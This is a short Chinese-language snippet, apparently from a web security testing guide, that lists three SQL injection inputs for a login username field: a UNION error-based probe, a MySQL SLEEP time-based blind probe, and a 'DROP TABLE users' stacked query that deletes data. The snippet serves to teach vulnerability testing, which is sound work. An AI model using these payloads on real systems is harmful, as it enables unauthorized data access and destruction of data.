# 搞崩 1：报错注入 — 让数据库报错，从错误信息里套库名、表名
# 在用户名输入：
' OR 1=1 UNION SELECT 1,2,3,4,5 --
# 如果返回了"列数不匹配"的报错，说明可以 UNION 查询
# 如果报错信息里出现了"users"、"columns"等关键词，就是信息泄露

# 搞崩 2：时间盲注 — 不返回数据也能测
# 在用户名输入：
' OR IF(1=1, SLEEP(5), 0) --
# 如果登录请求卡了 5 秒才返回 → 存在时间盲注漏洞
# 如果立即返回 → 没有注入或者数据库不是 MySQL（SLEEP 函数不通用）

# 搞崩 3：删表测试（⚠️ 仅限测试环境！）
# 在用户名输入：
admin'; DROP TABLE users; --
# 如果系统没做权限隔离，users 表被删了
# 一般人我不建议试这个，但你得知道它可能发生
